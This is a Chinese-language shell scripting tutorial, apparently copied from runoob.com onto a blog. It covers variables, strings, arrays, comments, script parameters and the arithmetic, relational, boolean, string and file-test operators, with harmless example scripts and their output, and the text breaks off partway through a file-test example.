<h2 id="变量类型"><a href="#变量类型" class="headerlink" title="变量类型"></a>变量类型</h2><p>运行shell时，会同时存在三种变量：</p>
<p>1) 局部变量 局部变量在脚本或命令中定义，仅在当前shell实例中有效，其他shell启动的程序不能访问局部变量。<br>2) 环境变量 所有的程序，包括shell启动的程序，都能访问环境变量，有些程序需要环境变量来保证其正常运行。必要的时候shell脚本也可以定义环境变量。<br>3) shell变量 shell变量是由shell程序设置的特殊变量。shell变量中有一部分是环境变量，有一部分是局部变量，这些变量保证了shell的正常运行</p>
<h2 id="Shell-字符串"><a href="#Shell-字符串" class="headerlink" title="Shell 字符串"></a>Shell 字符串</h2><p>字符串是shell编程中最常用最有用的数据类型（除了数字和字符串，也没啥其它类型好用了），字符串可以用单引号，也可以用双引号，也可以不用引号。单双引号的区别跟PHP类似。</p>
<h2 id="单引号"><a href="#单引号" class="headerlink" title="单引号"></a>单引号</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">str=&apos;this is a string&apos;</span><br></pre></td></tr></table></figure>
<p>单引号字符串的限制：</p>
<ol>
<li>单引号里的任何字符都会原样输出，单引号字符串中的变量是无效的；</li>
<li>单引号字串中不能出现单独一个的单引号（对单引号使用转义符后也不行），但可成对出现，作为字符串拼接使用。</li>
</ol>
<h2 id="双引号"><a href="#双引号" class="headerlink" title="双引号"></a>双引号</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">your_name=&apos;runoob&apos;</span><br><span class="line">str=&quot;Hello, I know you are \&quot;$your_name\&quot;! \n&quot;</span><br><span class="line">echo -e $str</span><br></pre></td></tr></table></figure>
<p>输出结果为：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hello, I know you are &quot;runoob&quot;!</span><br></pre></td></tr></table></figure></p>
<p>双引号的优点：</p>
<p>双引号里可以有变量<br>双引号里可以出现转义字符</p>
<h2 id="拼接字符串"><a href="#拼接字符串" class="headerlink" title="拼接字符串"></a>拼接字符串</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">your_name=&quot;runoob&quot;</span><br><span class="line"># 使用双引号拼接</span><br><span class="line">greeting=&quot;hello, &quot;$your_name&quot; !&quot;</span><br><span class="line">greeting_1=&quot;hello, $&#123;your_name&#125; !&quot;</span><br><span class="line">echo $greeting  $greeting_1</span><br><span class="line"># 使用单引号拼接</span><br><span class="line">greeting_2=&apos;hello, &apos;$your_name&apos; !&apos;</span><br><span class="line">greeting_3=&apos;hello, $&#123;your_name&#125; !&apos;</span><br><span class="line">echo $greeting_2  $greeting_3</span><br></pre></td></tr></table></figure>
<p>输出结果为：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hello, runoob ! hello, runoob !</span><br><span class="line">hello, runoob ! hello, $&#123;your_name&#125; !</span><br></pre></td></tr></table></figure></p>
<h2 id="获取字符串长度"><a href="#获取字符串长度" class="headerlink" title="获取字符串长度"></a>获取字符串长度</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">string=&quot;abcd&quot;</span><br><span class="line">echo $&#123;#string&#125; #输出 4</span><br></pre></td></tr></table></figure>
<h2 id="提取子字符串"><a href="#提取子字符串" class="headerlink" title="提取子字符串"></a>提取子字符串</h2><p>以下实例从字符串第 2 个字符开始截取 4 个字符：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">string=&quot;runoob is a great site&quot;</span><br><span class="line">echo $&#123;string:1:4&#125; # 输出 unoo</span><br></pre></td></tr></table></figure></p>
<h2 id="查找子字符串"><a href="#查找子字符串" class="headerlink" title="查找子字符串"></a>查找子字符串</h2><p>查找字符 i 或 o 的位置(哪个字母先出现就计算哪个)：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">string=&quot;runoob is a great site&quot;</span><br><span class="line">echo `expr index &quot;$string&quot; io`  # 输出 4</span><br></pre></td></tr></table></figure></p>
<p>注意： 以上脚本中 ` 是反引号，而不是单引号 ‘，不要看错了哦。</p>
<h2 id="Shell-数组"><a href="#Shell-数组" class="headerlink" title="Shell 数组"></a>Shell 数组</h2><p>bash支持一维数组（不支持多维数组），并且没有限定数组的大小。</p>
<p>类似于 C 语言，数组元素的下标由 0 开始编号。获取数组中的元素要利用下标，下标可以是整数或算术表达式，其值应大于或等于 0。</p>
<p>定义数组</p>
<p>在 Shell 中，用括号来表示数组，数组元素用”空格”符号分割开。定义数组的一般形式为：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">数组名=(值1 值2 ... 值n)</span><br></pre></td></tr></table></figure></p>
<p>例如：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array_name=(value0 value1 value2 value3)</span><br></pre></td></tr></table></figure></p>
<p>或者<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array_name=(</span><br><span class="line">value0</span><br><span class="line">value1</span><br><span class="line">value2</span><br><span class="line">value3</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p>
<p>还可以单独定义数组的各个分量：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array_name[0]=value0</span><br><span class="line">array_name[1]=value1</span><br><span class="line">array_name[n]=valuen</span><br></pre></td></tr></table></figure></p>
<p>可以不使用连续的下标，而且下标的范围没有限制。</p>
<h2 id="读取数组"><a href="#读取数组" class="headerlink" title="读取数组"></a>读取数组</h2><p>读取数组元素值的一般格式是：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;数组名[下标]&#125;</span><br></pre></td></tr></table></figure></p>
<p>例如：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">valuen=$&#123;array_name[n]&#125;</span><br></pre></td></tr></table></figure></p>
<p>使用 @ 符号可以获取数组中的所有元素，例如：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo $&#123;array_name[@]&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="获取数组的长度"><a href="#获取数组的长度" class="headerlink" title="获取数组的长度"></a>获取数组的长度</h2><p>获取数组长度的方法与获取字符串长度的方法相同，例如：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 取得数组元素的个数</span><br><span class="line">length=$&#123;#array_name[@]&#125;</span><br><span class="line"># 或者</span><br><span class="line">length=$&#123;#array_name[*]&#125;</span><br><span class="line"># 取得数组单个元素的长度</span><br><span class="line">lengthn=$&#123;#array_name[n]&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="Shell-注释"><a href="#Shell-注释" class="headerlink" title="Shell 注释"></a>Shell 注释</h2><p>以 # 开头的行就是注释，会被解释器忽略。</p>
<p>通过每一行加一个 # 号设置多行注释，像这样：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#--------------------------------------------</span><br><span class="line"># 这是一个注释</span><br><span class="line"># author：菜鸟教程</span><br><span class="line"># site：www.runoob.com</span><br><span class="line"># slogan：学的不仅是技术，更是梦想！</span><br><span class="line">#--------------------------------------------</span><br><span class="line">##### 用户配置区 开始 #####</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line"># 这里可以添加脚本描述信息</span><br><span class="line"># </span><br><span class="line">#</span><br><span class="line">##### 用户配置区 结束  #####</span><br></pre></td></tr></table></figure></p>
<p>如果在开发过程中，遇到大段的代码需要临时注释起来，过一会儿又取消注释，怎么办呢？</p>
<p>每一行加个#符号太费力了，可以把这一段要注释的代码用一对花括号括起来，定义成一个函数，没有地方调用这个函数，这块代码就不会执行，达到了和注释一样的效果。</p>
<h2 id="多行注释"><a href="#多行注释" class="headerlink" title="多行注释"></a>多行注释</h2><p>多行注释还可以使用以下格式：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">:&lt;&lt;EOF</span><br><span class="line">注释内容...</span><br><span class="line">注释内容...</span><br><span class="line">注释内容...</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure></p>
<p>EOF 也可以使用其他符号:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">:&lt;&lt;&apos;</span><br><span class="line">注释内容...</span><br><span class="line">注释内容...</span><br><span class="line">注释内容...</span><br><span class="line">&apos;</span><br><span class="line"></span><br><span class="line">:&lt;&lt;!</span><br><span class="line">注释内容...</span><br><span class="line">注释内容...</span><br><span class="line">注释内容...</span><br><span class="line">!</span><br></pre></td></tr></table></figure></p>
<h2 id="Shell-传递参数"><a href="#Shell-传递参数" class="headerlink" title="Shell 传递参数"></a>Shell 传递参数</h2><p>我们可以在执行 Shell 脚本时，向脚本传递参数，脚本内获取参数的格式为：$n。n 代表一个数字，1 为执行脚本的第一个参数，2 为执行脚本的第二个参数，以此类推……</p>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>以下实例我们向脚本传递三个参数，并分别输出，其中 $0 为执行的文件名：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"># author:菜鸟教程</span><br><span class="line"># url:www.runoob.com</span><br><span class="line"></span><br><span class="line">echo &quot;Shell 传递参数实例！&quot;;</span><br><span class="line">echo &quot;执行的文件名：$0&quot;;</span><br><span class="line">echo &quot;第一个参数为：$1&quot;;</span><br><span class="line">echo &quot;第二个参数为：$2&quot;;</span><br><span class="line">echo &quot;第三个参数为：$3&quot;;</span><br></pre></td></tr></table></figure></p>
<p>为脚本设置可执行权限，并执行脚本，输出结果如下所示：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ chmod +x test.sh </span><br><span class="line">$ ./test.sh 1 2 3</span><br><span class="line">Shell 传递参数实例！</span><br><span class="line">执行的文件名：./test.sh</span><br><span class="line">第一个参数为：1</span><br><span class="line">第二个参数为：2</span><br><span class="line">第三个参数为：3</span><br></pre></td></tr></table></figure></p>
<p>另外，还有几个特殊字符用来处理参数：<br><img src="https://mfaying.github.io/static/images/shell/1.jpg" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"># author:菜鸟教程</span><br><span class="line"># url:www.runoob.com</span><br><span class="line"></span><br><span class="line">echo &quot;Shell 传递参数实例！&quot;;</span><br><span class="line">echo &quot;第一个参数为：$1&quot;;</span><br><span class="line"></span><br><span class="line">echo &quot;参数个数为：$#&quot;;</span><br><span class="line">echo &quot;传递的参数作为一个字符串显示：$*&quot;;</span><br></pre></td></tr></table></figure>
<p>执行脚本，输出结果如下所示：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ chmod +x test.sh </span><br><span class="line">$ ./test.sh 1 2 3</span><br><span class="line">Shell 传递参数实例！</span><br><span class="line">第一个参数为：1</span><br><span class="line">参数个数为：3</span><br><span class="line">传递的参数作为一个字符串显示：1 2 3</span><br></pre></td></tr></table></figure></p>
<p>$* 与 $@ 区别：</p>
<p>相同点：都是引用所有参数。<br>不同点：只有在双引号中体现出来。假设在脚本运行时写了三个参数 1、2、3，，则 “ * “ 等价于 “1 2 3”（传递了一个参数），而 “@” 等价于 “1” “2” “3”（传递了三个参数）。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"># author:菜鸟教程</span><br><span class="line"># url:www.runoob.com</span><br><span class="line"></span><br><span class="line">echo &quot;-- \$* 演示 ---&quot;</span><br><span class="line">for i in &quot;$*&quot;; do</span><br><span class="line">    echo $i</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">echo &quot;-- \$@ 演示 ---&quot;</span><br><span class="line">for i in &quot;$@&quot;; do</span><br><span class="line">    echo $i</span><br><span class="line">done</span><br></pre></td></tr></table></figure></p>
<p>执行脚本，输出结果如下所示：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ chmod +x test.sh </span><br><span class="line">$ ./test.sh 1 2 3</span><br><span class="line">-- $* 演示 ---</span><br><span class="line">1 2 3</span><br><span class="line">-- $@ 演示 ---</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td></tr></table></figure></p>
<h2 id="Shell-数组-1"><a href="#Shell-数组-1" class="headerlink" title="Shell 数组"></a>Shell 数组</h2><p>数组中可以存放多个值。Bash Shell 只支持一维数组（不支持多维数组），初始化时不需要定义数组大小（与 PHP 类似）。</p>
<p>与大部分编程语言类似，数组元素的下标由0开始。</p>
<p>Shell 数组用括号来表示，元素用”空格”符号分割开，语法格式如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array_name=(value1 ... valuen)</span><br></pre></td></tr></table></figure></p>
<h2 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"># author:菜鸟教程</span><br><span class="line"># url:www.runoob.com</span><br><span class="line"></span><br><span class="line">my_array=(A B &quot;C&quot; D)</span><br></pre></td></tr></table></figure>
<p>我们也可以使用下标来定义数组:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array_name[0]=value0</span><br><span class="line">array_name[1]=value1</span><br><span class="line">array_name[2]=value2</span><br></pre></td></tr></table></figure></p>
<h2 id="读取数组-1"><a href="#读取数组-1" class="headerlink" title="读取数组"></a>读取数组</h2><p>读取数组元素值的一般格式是：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;array_name[index]&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a>实例</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"># author:菜鸟教程</span><br><span class="line"># url:www.runoob.com</span><br><span class="line"></span><br><span class="line">my_array=(A B &quot;C&quot; D)</span><br><span class="line"></span><br><span class="line">echo &quot;第一个元素为: $&#123;my_array[0]&#125;&quot;</span><br><span class="line">echo &quot;第二个元素为: $&#123;my_array[1]&#125;&quot;</span><br><span class="line">echo &quot;第三个元素为: $&#123;my_array[2]&#125;&quot;</span><br><span class="line">echo &quot;第四个元素为: $&#123;my_array[3]&#125;&quot;</span><br></pre></td></tr></table></figure>
<p>执行脚本，输出结果如下所示：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ chmod +x test.sh </span><br><span class="line">$ ./test.sh</span><br><span class="line">第一个元素为: A</span><br><span class="line">第二个元素为: B</span><br><span class="line">第三个元素为: C</span><br><span class="line">第四个元素为: D</span><br></pre></td></tr></table></figure></p>
<h2 id="获取数组中的所有元素"><a href="#获取数组中的所有元素" class="headerlink" title="获取数组中的所有元素"></a>获取数组中的所有元素</h2><p>使用@ 或 * 可以获取数组中的所有元素，例如：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"># author:菜鸟教程</span><br><span class="line"># url:www.runoob.com</span><br><span class="line"></span><br><span class="line">my_array[0]=A</span><br><span class="line">my_array[1]=B</span><br><span class="line">my_array[2]=C</span><br><span class="line">my_array[3]=D</span><br><span class="line"></span><br><span class="line">echo &quot;数组的元素为: $&#123;my_array[*]&#125;&quot;</span><br><span class="line">echo &quot;数组的元素为: $&#123;my_array[@]&#125;&quot;</span><br></pre></td></tr></table></figure></p>
<p>执行脚本，输出结果如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ chmod +x test.sh </span><br><span class="line">$ ./test.sh</span><br><span class="line">数组的元素为: A B C D</span><br><span class="line">数组的元素为: A B C D</span><br></pre></td></tr></table></figure>
<h2 id="获取数组的长度-1"><a href="#获取数组的长度-1" class="headerlink" title="获取数组的长度"></a>获取数组的长度</h2><p>获取数组长度的方法与获取字符串长度的方法相同，例如：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"># author:菜鸟教程</span><br><span class="line"># url:www.runoob.com</span><br><span class="line"></span><br><span class="line">my_array[0]=A</span><br><span class="line">my_array[1]=B</span><br><span class="line">my_array[2]=C</span><br><span class="line">my_array[3]=D</span><br><span class="line"></span><br><span class="line">echo &quot;数组元素个数为: $&#123;#my_array[*]&#125;&quot;</span><br><span class="line">echo &quot;数组元素个数为: $&#123;#my_array[@]&#125;&quot;</span><br></pre></td></tr></table></figure></p>
<p>执行脚本，输出结果如下所示：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ chmod +x test.sh </span><br><span class="line">$ ./test.sh</span><br><span class="line">数组元素个数为: 4</span><br><span class="line">数组元素个数为: 4</span><br></pre></td></tr></table></figure></p>
<h2 id="Shell-基本运算符"><a href="#Shell-基本运算符" class="headerlink" title="Shell 基本运算符"></a>Shell 基本运算符</h2><p>Shell 和其他编程语言一样，支持多种运算符，包括：</p>
<ol>
<li>算数运算符</li>
<li>关系运算符</li>
<li>布尔运算符</li>
<li>字符串运算符</li>
<li>文件测试运算符<br>原生bash不支持简单的数学运算，但是可以通过其他命令来实现，例如 awk 和 expr，expr 最常用。</li>
</ol>
<p>expr 是一款表达式计算工具，使用它能完成表达式的求值操作。</p>
<p>例如，两个数相加(注意使用的是反引号 ` 而不是单引号 ‘)：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">val=`expr 2 + 2`</span><br><span class="line">echo &quot;两数之和为 : $val&quot;</span><br></pre></td></tr></table></figure></p>
<p>执行脚本，输出结果如下所示：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">两数之和为 : 4</span><br></pre></td></tr></table></figure></p>
<p>两点注意：</p>
<p>表达式和运算符之间要有空格，例如 2+2 是不对的，必须写成 2 + 2，这与我们熟悉的大多数编程语言不一样。<br>完整的表达式要被 <code></code> 包含，注意这个字符不是常用的单引号，在 Esc 键下边。</p>
<h2 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h2><p>下表列出了常用的算术运算符，假定变量 a 为 10，变量 b 为 20：<br><img src="https://mfaying.github.io/static/images/shell/2.jpg" alt><br>注意：条件表达式要放在方括号之间，并且要有空格，例如: [$a==$b] 是错误的，必须写成 [ $a == $b ]。</p>
<p>实例<br>算术运算符实例如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"># author:菜鸟教程</span><br><span class="line"># url:www.runoob.com</span><br><span class="line"></span><br><span class="line">a=10</span><br><span class="line">b=20</span><br><span class="line"></span><br><span class="line">val=`expr $a + $b`</span><br><span class="line">echo &quot;a + b : $val&quot;</span><br><span class="line"></span><br><span class="line">val=`expr $a - $b`</span><br><span class="line">echo &quot;a - b : $val&quot;</span><br><span class="line"></span><br><span class="line">val=`expr $a \* $b`</span><br><span class="line">echo &quot;a * b : $val&quot;</span><br><span class="line"></span><br><span class="line">val=`expr $b / $a`</span><br><span class="line">echo &quot;b / a : $val&quot;</span><br><span class="line"></span><br><span class="line">val=`expr $b % $a`</span><br><span class="line">echo &quot;b % a : $val&quot;</span><br><span class="line"></span><br><span class="line">if [ $a == $b ]</span><br><span class="line">then</span><br><span class="line">   echo &quot;a 等于 b&quot;</span><br><span class="line">fi</span><br><span class="line">if [ $a != $b ]</span><br><span class="line">then</span><br><span class="line">   echo &quot;a 不等于 b&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure></p>
<p>执行脚本，输出结果如下所示：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a + b : 30</span><br><span class="line">a - b : -10</span><br><span class="line">a * b : 200</span><br><span class="line">b / a : 2</span><br><span class="line">b % a : 0</span><br><span class="line">a 不等于 b</span><br></pre></td></tr></table></figure></p>
<p>注意：</p>
<p>乘号(<em>)前边必须加反斜杠()才能实现乘法运算；<br>if…then…fi 是条件语句，后续将会讲解。<br>在 MAC 中 shell 的 expr 语法是：$((表达式))，此处表达式中的 “</em>“ 不需要转义符号 “\” 。</p>
<h2 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h2><p>关系运算符只支持数字，不支持字符串，除非字符串的值是数字。</p>
<p>下表列出了常用的关系运算符，假定变量 a 为 10，变量 b 为 20：<br><img src="https://mfaying.github.io/static/images/shell/3.jpg" alt="avatar"></p>
<h2 id="实例-3"><a href="#实例-3" class="headerlink" title="实例"></a>实例</h2><p>关系运算符实例如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"># author:菜鸟教程</span><br><span class="line"># url:www.runoob.com</span><br><span class="line"></span><br><span class="line">a=10</span><br><span class="line">b=20</span><br><span class="line"></span><br><span class="line">if [ $a -eq $b ]</span><br><span class="line">then</span><br><span class="line">   echo &quot;$a -eq $b : a 等于 b&quot;</span><br><span class="line">else</span><br><span class="line">   echo &quot;$a -eq $b: a 不等于 b&quot;</span><br><span class="line">fi</span><br><span class="line">if [ $a -ne $b ]</span><br><span class="line">then</span><br><span class="line">   echo &quot;$a -ne $b: a 不等于 b&quot;</span><br><span class="line">else</span><br><span class="line">   echo &quot;$a -ne $b : a 等于 b&quot;</span><br><span class="line">fi</span><br><span class="line">if [ $a -gt $b ]</span><br><span class="line">then</span><br><span class="line">   echo &quot;$a -gt $b: a 大于 b&quot;</span><br><span class="line">else</span><br><span class="line">   echo &quot;$a -gt $b: a 不大于 b&quot;</span><br><span class="line">fi</span><br><span class="line">if [ $a -lt $b ]</span><br><span class="line">then</span><br><span class="line">   echo &quot;$a -lt $b: a 小于 b&quot;</span><br><span class="line">else</span><br><span class="line">   echo &quot;$a -lt $b: a 不小于 b&quot;</span><br><span class="line">fi</span><br><span class="line">if [ $a -ge $b ]</span><br><span class="line">then</span><br><span class="line">   echo &quot;$a -ge $b: a 大于或等于 b&quot;</span><br><span class="line">else</span><br><span class="line">   echo &quot;$a -ge $b: a 小于 b&quot;</span><br><span class="line">fi</span><br><span class="line">if [ $a -le $b ]</span><br><span class="line">then</span><br><span class="line">   echo &quot;$a -le $b: a 小于或等于 b&quot;</span><br><span class="line">else</span><br><span class="line">   echo &quot;$a -le $b: a 大于 b&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure></p>
<p>执行脚本，输出结果如下所示：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10 -eq 20: a 不等于 b</span><br><span class="line">10 -ne 20: a 不等于 b</span><br><span class="line">10 -gt 20: a 不大于 b</span><br><span class="line">10 -lt 20: a 小于 b</span><br><span class="line">10 -ge 20: a 小于 b</span><br><span class="line">10 -le 20: a 小于或等于 b</span><br></pre></td></tr></table></figure></p>
<h2 id="布尔运算符"><a href="#布尔运算符" class="headerlink" title="布尔运算符"></a>布尔运算符</h2><p>下表列出了常用的布尔运算符，假定变量 a 为 10，变量 b 为 20：<br><img src="https://mfaying.github.io/static/images/shell/4.jpg" alt="avatar"></p>
<p>实例<br>布尔运算符实例如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"># author:菜鸟教程</span><br><span class="line"># url:www.runoob.com</span><br><span class="line"></span><br><span class="line">a=10</span><br><span class="line">b=20</span><br><span class="line"></span><br><span class="line">if [ $a != $b ]</span><br><span class="line">then</span><br><span class="line">   echo &quot;$a != $b : a 不等于 b&quot;</span><br><span class="line">else</span><br><span class="line">   echo &quot;$a == $b: a 等于 b&quot;</span><br><span class="line">fi</span><br><span class="line">if [ $a -lt 100 -a $b -gt 15 ]</span><br><span class="line">then</span><br><span class="line">   echo &quot;$a 小于 100 且 $b 大于 15 : 返回 true&quot;</span><br><span class="line">else</span><br><span class="line">   echo &quot;$a 小于 100 且 $b 大于 15 : 返回 false&quot;</span><br><span class="line">fi</span><br><span class="line">if [ $a -lt 100 -o $b -gt 100 ]</span><br><span class="line">then</span><br><span class="line">   echo &quot;$a 小于 100 或 $b 大于 100 : 返回 true&quot;</span><br><span class="line">else</span><br><span class="line">   echo &quot;$a 小于 100 或 $b 大于 100 : 返回 false&quot;</span><br><span class="line">fi</span><br><span class="line">if [ $a -lt 5 -o $b -gt 100 ]</span><br><span class="line">then</span><br><span class="line">   echo &quot;$a 小于 5 或 $b 大于 100 : 返回 true&quot;</span><br><span class="line">else</span><br><span class="line">   echo &quot;$a 小于 5 或 $b 大于 100 : 返回 false&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure></p>
<p>执行脚本，输出结果如下所示：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10 != 20 : a 不等于 b</span><br><span class="line">10 小于 100 且 20 大于 15 : 返回 true</span><br><span class="line">10 小于 100 或 20 大于 100 : 返回 true</span><br><span class="line">10 小于 5 或 20 大于 100 : 返回 false</span><br></pre></td></tr></table></figure></p>
<h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><p>以下介绍 Shell 的逻辑运算符，假定变量 a 为 10，变量 b 为 20:<br><img src="https://mfaying.github.io/static/images/shell/5.jpg" alt="avatar"><br>实例<br>逻辑运算符实例如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"># author:菜鸟教程</span><br><span class="line"># url:www.runoob.com</span><br><span class="line"></span><br><span class="line">a=10</span><br><span class="line">b=20</span><br><span class="line"></span><br><span class="line">if [[ $a -lt 100 &amp;&amp; $b -gt 100 ]]</span><br><span class="line">then</span><br><span class="line">   echo &quot;返回 true&quot;</span><br><span class="line">else</span><br><span class="line">   echo &quot;返回 false&quot;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">if [[ $a -lt 100 || $b -gt 100 ]]</span><br><span class="line">then</span><br><span class="line">   echo &quot;返回 true&quot;</span><br><span class="line">else</span><br><span class="line">   echo &quot;返回 false&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure></p>
<p>执行脚本，输出结果如下所示：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">返回 false</span><br><span class="line">返回 true</span><br></pre></td></tr></table></figure></p>
<h2 id="字符串运算符"><a href="#字符串运算符" class="headerlink" title="字符串运算符"></a>字符串运算符</h2><p>下表列出了常用的字符串运算符，假定变量 a 为 “abc”，变量 b 为 “efg”：<br><img src="https://mfaying.github.io/static/images/shell/6.jpg" alt="avatar"></p>
<h2 id="实例-4"><a href="#实例-4" class="headerlink" title="实例"></a>实例</h2><p>字符串运算符实例如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"># author:菜鸟教程</span><br><span class="line"># url:www.runoob.com</span><br><span class="line"></span><br><span class="line">a=&quot;abc&quot;</span><br><span class="line">b=&quot;efg&quot;</span><br><span class="line"></span><br><span class="line">if [ $a = $b ]</span><br><span class="line">then</span><br><span class="line">   echo &quot;$a = $b : a 等于 b&quot;</span><br><span class="line">else</span><br><span class="line">   echo &quot;$a = $b: a 不等于 b&quot;</span><br><span class="line">fi</span><br><span class="line">if [ $a != $b ]</span><br><span class="line">then</span><br><span class="line">   echo &quot;$a != $b : a 不等于 b&quot;</span><br><span class="line">else</span><br><span class="line">   echo &quot;$a != $b: a 等于 b&quot;</span><br><span class="line">fi</span><br><span class="line">if [ -z $a ]</span><br><span class="line">then</span><br><span class="line">   echo &quot;-z $a : 字符串长度为 0&quot;</span><br><span class="line">else</span><br><span class="line">   echo &quot;-z $a : 字符串长度不为 0&quot;</span><br><span class="line">fi</span><br><span class="line">if [ -n &quot;$a&quot; ]</span><br><span class="line">then</span><br><span class="line">   echo &quot;-n $a : 字符串长度不为 0&quot;</span><br><span class="line">else</span><br><span class="line">   echo &quot;-n $a : 字符串长度为 0&quot;</span><br><span class="line">fi</span><br><span class="line">if [ $a ]</span><br><span class="line">then</span><br><span class="line">   echo &quot;$a : 字符串不为空&quot;</span><br><span class="line">else</span><br><span class="line">   echo &quot;$a : 字符串为空&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure></p>
<p>执行脚本，输出结果如下所示：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">abc = efg: a 不等于 b</span><br><span class="line">abc != efg : a 不等于 b</span><br><span class="line">-z abc : 字符串长度不为 0</span><br><span class="line">-n abc : 字符串长度不为 0</span><br><span class="line">abc : 字符串不为空</span><br></pre></td></tr></table></figure></p>
<h2 id="文件测试运算符"><a href="#文件测试运算符" class="headerlink" title="文件测试运算符"></a>文件测试运算符</h2><p>文件测试运算符用于检测 Unix 文件的各种属性。</p>
<p>属性检测描述如下：<br><img src="https://mfaying.github.io/static/images/shell/7.jpg" alt="avatar"><br>其他检查符：</p>
<p>-S: 判断某文件是否 socket。<br>-L: 检测文件是否存在并且是一个符号链接。</p>
<h2 id="实例-5"><a href="#实例-5" class="headerlink" title="实例"></a>实例</h2><p>变量 file 表示文件 /var/www/runoob/test.sh，它的大小为 100 字节，具有 rwx 权限。下面的代码，将检测该文件的各种属性：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"># author:菜鸟教程</span><br><span class="line"># url:www.runoob.com</span><br><span class="line"></span><br><span class="line">file=&quot;/var/www/runoob/test.sh&quot;</span><br><span class="line">if [ -r $file ]</span><br><span class="line">then</span><br><span class="line">   echo &quot;文件可读&quot;</span><br><span class="line">else</span><br><span class="line">   echo &quot;文件不可读&quot;</span><br><span class="line">fi</span><br><span class="line">if [ -w $file ]</span><br><span class="line">then</span><br><span class="line">   echo &quot;文件可写&quot;</span><br><span class="line">else</span><br><span class="line">   echo &quot;文件不可写&quot;</span><br><span class="line">fi</span><br><span class="line">if [ -x $file ]</span><br><span class="line">then</span><br><span class="line">   echo &quot;文件可执行&quot;</span><br><span class="line">else</span><br><span class="line">   echo &quot;文件不可执行&quot;</span><br><span class="line">fi</span><br><span class="line">if [ -f $file ]</span><br><span class="line">then</span><br><span class="line">   echo &quot;文件为普通文件&quot;</span><br><span class="line">else</span><br><span class="line">   echo &quot;文件为特殊文件&quot;</span><br><span class="line">fi</span><br><span class="line">if [ -d $file ]</span><br><span 